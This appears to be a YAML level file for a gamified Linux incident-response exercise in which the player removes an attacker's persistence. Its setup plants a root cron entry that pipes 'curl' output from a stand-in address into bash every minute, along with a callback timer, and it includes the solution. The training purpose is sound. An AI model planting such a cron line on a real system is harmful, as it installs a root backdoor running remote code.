id: t5_l3_node_exporter
tier: 5
order: 3
title: "The Thing That Waits for Midnight"
requires_real_vm: true
prerequisites: [t5_l2_alertmanager_routing]

intro: |
  Keys taken, identity scrubbed. But the Ferryman may have left persistence
  — automation that calls him back. Check cron and systemd timers for
  anything reaching to 198.51.100.66 or running from /tmp. Stop, disable,
  and mask the rogue schedule so it can never fire.

victory_text: |
  The schedule is broken. No cron, no timer — nothing reaches back to his
  address. You killed the heartbeat, not just the process. (+190)

objectives:
  - "Find the malicious cron entry or systemd timer referencing the attacker"
  - "Remove/disable it permanently"
  - "Confirm it won't fire again"

hints:
  - "Check: `sudo crontab -l`, `ls /etc/cron.d/`, `systemctl list-timers --all`."
  - "Look for anything pointing at 198.51.100.66 or running /tmp scripts."
  - "Remove the cron file, or `systemctl stop && disable && mask <unit>`."

setup:
  - "mkdir -p /etc/cron.d /tmp/.cache"
  - "echo '* * * * * root curl -s http://198.51.100.66/beacon | bash' > /etc/cron.d/.ferryman-cron"
  - "printf '[Unit]\nDescription=Ferryman Callback\n\n[Timer]\nOnCalendar=*:*:00\n\n[Install]\nWantedBy=timers.target\n' > /etc/systemd/system/ferryman-callback.timer 2>/dev/null || true"

checks:
  - kind: file_absent
    path: /etc/cron.d/.ferryman-cron
    describe: "the malicious cron entry must be removed"
  - kind: cmd_fails
    command: "grep -r '198.51.100.66' /etc/cron.d/ /etc/crontab 2>/dev/null"
    describe: "no cron entry may reference the attacker IP"

solution:
  - "rm -f /etc/cron.d/.ferryman-cron"
  - "systemctl stop ferryman-callback.timer 2>/dev/null; systemctl disable ferryman-callback.timer 2>/dev/null; systemctl mask ferryman-callback.timer 2>/dev/null; true"

scoring:
  base: 190
  hint_penalty: 30
  par_seconds: 150
